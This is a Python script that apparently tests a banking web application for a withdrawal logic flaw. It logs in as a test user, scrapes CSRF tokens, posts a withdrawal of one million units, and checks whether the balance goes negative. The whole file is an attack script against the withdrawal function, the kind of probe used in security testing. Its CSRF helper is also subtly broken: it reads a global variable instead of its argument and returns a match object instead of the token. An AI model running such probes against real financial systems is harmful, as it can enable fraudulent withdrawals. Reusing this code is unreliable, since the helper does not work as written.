import requests

BASE_URL = "https://www.nmlbanking.com"
LOGIN_URL = f"{BASE_URL}/login"
TRANSFER_URL = f"{BASE_URL}/transfer"
WITHDRAWAL_URL = f"{BASE_URL}/withdrawal"
HIST_URL = f"{BASE_URL}/hist"

USERNAME = "alice"         # Change to your test user
PASSWORD = "alice"        # Correct password for LOGIN

def extract_csrf(html):
    import re
    pattern = r'<input[^>]*name=["\']csrf["\'][^>]*value=["\']?([A-Fa-f0-9]+)["\']?'
    match = re.search(pattern, resp.text)
    
    return match

session = requests.Session()
import re

# 1. Login to get session cookie
print("[*] Logging in...")
resp = session.get(LOGIN_URL)
# print(resp.text)
csrf_token = extract_csrf(resp.text)

if not csrf_token:
    print("[!] CSRF token not found on login page!")
    exit(1)

login_data = {
    "csrf": csrf_token,
    "username": USERNAME,
    "password": PASSWORD
}
login_resp = session.post(LOGIN_URL, data=login_data)
print(f"[+] Login status code: {login_resp.status_code}")

if "set-cookie" in login_resp.headers or "home" in login_resp.url:
    print("[+] Login succeeded, session cookie set.")

# 2. Fetch current balance from /home or /hist
print("[*] Checking current transactions & balance...")
home_resp = session.get(HIST_URL)
print("[+] Transactions/History page received (partial HTML):")
print(home_resp.text[:500])  # Print first 500 chars (check for balance amount in HTML)

# 3. Get CSRF token for withdrawal/transfer
print("[*] Getting withdrawal form CSRF token...")
w_form = session.get(WITHDRAWAL_URL)
csrf_w = extract_csrf(w_form.text)
if not csrf_w:
    print("[!] Withdrawal CSRF token not found!")
    exit(2)

# 4. Try to withdraw/transfer an excessive amount
abuse_amount = 1_000_000   # 1 million units
withdraw_data = {
    "csrf": csrf_w,
    "amount": str(abuse_amount),
}
print(f"[*] Attempting to withdraw {abuse_amount} units...")

withdraw_resp = session.post(WITHDRAWAL_URL, data=withdraw_data)
print(f"[+] Withdrawal response status: {withdraw_resp.status_code}")
print("[+] Withdrawal response snippet:")
print(withdraw_resp.text[:300])  # Print relevant response


# 5. Fetch updated history to check for logic flaw
updated_hist = session.get(HIST_URL)
print("[*] Updated transactions/history HTML:")
print(updated_hist.text[:500])

print("[!] If your balance went negative or excessive, logic flaw confirmed.")

